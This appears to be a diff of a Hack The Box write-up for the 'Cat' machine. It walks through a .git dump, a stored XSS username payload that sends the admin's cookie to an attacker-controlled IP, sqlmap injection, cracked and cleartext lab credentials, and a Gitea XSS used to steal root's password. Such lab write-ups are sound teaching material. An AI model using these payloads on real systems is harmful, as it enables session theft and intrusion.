@@ -1,25 +1,24 @@
 ---
 sticker: emoji//1f638
 ---
+# ENUMERATION
+---
 
-# CAT
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We need to add `cat.htb` to `/etc/hosts`:
 
@@ -27,7 +26,8 @@ We need to add `cat.htb` to `/etc/hosts`:
 echo 'IP cat.htb' | sudo tee -a /etc/hosts
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415173410.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415173410.png)
 
 On the nmap scan, it said `.git` was enabled, we can try using `GitHack` to get the contents of the `.git` directory:
 
@@ -35,15 +35,18 @@ On the nmap scan, it said `.git` was enabled, we can try using `GitHack` to get 
 Repository: https://github.com/lijiejie/GitHack
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415175041.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175041.png)
 
 We got a few files, if we check `admin.php`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415175131.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175131.png)
+
 
 We found there's an user called `axel`, he may be the administrator of the web application, let's proceed with the web stuff then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415175512.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415175512.png)
 
 We can register in here, since we already have the source code of `login.php`, we can do an analysis of it:
 
@@ -73,44 +76,52 @@ if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
 }
 ```
 
-This is where the magic relies, this is vulnerable to XSS, The vulnerable code is in the registration handling where the `username` parameter is directly taken from the user input (`$_GET['username']`) and stored in the database **without sanitization**.
+This is where the magic relies, this is vulnerable to XSS, The vulnerable code is in the registration handling where the `username` parameter is directly taken from the user input (`$_GET['username']`) and stored in the database **without sanitization**.
 
 ```js
 if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
     $username = $_GET['username']; //No sanitization here
 ```
 
-This allows an attacker to inject malicious scripts into the `username` field, which will execute when the username is later displayed on a page that renders it without proper escaping. This means we can try creating a test account to steal the admin's cookie.
+This allows an attacker to inject malicious scripts into the `username` field, which will execute when the username is later displayed on a page that renders it without proper escaping. This means we can try creating a test account to steal the admin's cookie.
 
 Let's begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 We can create a malicious username:
+
 
 ```
 <script>document.location='http://10.10.15.39:8000/?c='+document.cookie;</script>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415180441.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415180114.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180441.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180114.png)
 
 Ok, registration went through, we can search for a way to exploit this, once we login, we can see that the `contest.php` page, seems suspicious:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415180212.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180212.png)
 
 We can send in some random data and check if the server is processing our username as code, we can maybe get the admin cookie based on the script we used on our username:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415180304.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180304.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415180517.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415180517.png)
+
 
 There we go, since it's been put into inspection, we know someone may be surveilling the data, most probably being the admin, if we check our python server, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250415182450.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250415182450.png)
 
 Nice, we got the cookie, since we got the source code of the files, I analyzed all of them and found this SQLI on `accept_cat.php`:
 
@@ -156,6 +167,7 @@ if (isset($_POST['catId']) && isset($_POST['catName'])) {
     $pdo->exec($sql_insert);
 ```
 
+
 Our vulnerable parameter is `catName`, we can use `sqlmap` in the following way knowing all this:
 
 ```
@@ -164,11 +176,11 @@ sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cooki
 
 If we check the output we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416123555.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123555.png)
 
 So, we got an username `rosa`, and a hash, let's crack the hash:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416123641.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123641.png)
 
 We got credentials:
 
@@ -176,23 +188,27 @@ We got credentials:
 rosa:soyunaprincesarosa
 ```
 
+
 Let's go into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416123724.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416123724.png)
 
 Let's begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 We can use `linpeas` to check for a PE vector:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416124804.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124804.png)
 
 We can see `access.log` is here, let's read it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416124841.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124841.png)
 
 There we go, we got `axel` password:
 
@@ -200,7 +216,7 @@ There we go, we got `axel` password:
 axel:aNdZwgC4tI9gnVXv_e3Q
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416124915.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416124915.png)
 
 We can now read `user.txt`:
 
@@ -211,11 +227,11 @@ axel@cat:~$ cat user.txt
 
 If we log into ssh using `axel` credentials, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416125949.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416125949.png)
 
 There's a message saying we have mail, we can check the contents of `/var/mail/axel`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416130053.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130053.png)
 
 It says there's a web application running on port 3000, we can use port forwarding to check the contents of it:
 
@@ -223,15 +239,17 @@ It says there's a web application running on port 3000, we can use port forwardi
 ssh -L 3000:127.0.0.1:3000 axel@cat.htb
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416130234.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130234.png)
 
 This is running `gitea 1.22.0`, we can log in using `axel` credentials, if we dig around, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416130340.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130340.png)
 
 Admin user is on here, seems like we can exploit this to get root access, let's search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416130417.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130417.png)
 
 ```
 ## Vulnerability Description
@@ -256,13 +274,14 @@ Nice, we can reproduce these steps, let's craft a more advanced payload to grab 
 
 In order to make this work, we need to create a repository:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416130652.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416130652.png)
 
 And we need to use the payload at the `description` field:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416132041.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132041.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416132052.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132052.png)
+
 
 Once we create the repository, we can send an email back to the administrator which in this case is `jobert`, let's send it like this:
 
@@ -272,11 +291,11 @@ echo -e "http://localhost:3000/axel/REPO-NAME" | sendmail jobert@localhost
 
 We need to have our python server ready before sending the email, once we send it, we can check this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416132139.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132139.png)
 
 Let's decode the data:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416132217.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132217.png)
 
 There we go, we got credentials for root:
 
@@ -286,7 +305,7 @@ root:IKw75eR0MR7CMIxhH0
 
 Let's switch to root:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250416132330.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250416132330.png)
 
 Now we can read `root.txt` and finish:
 
@@ -295,4 +314,7 @@ root@cat:/home/axel# cat /root/root.txt
 d22c2ea311a3f638c4dbae4cca596120
 ```
 
+
 https://www.hackthebox.com/achievement/machine/1872557/646
+
+
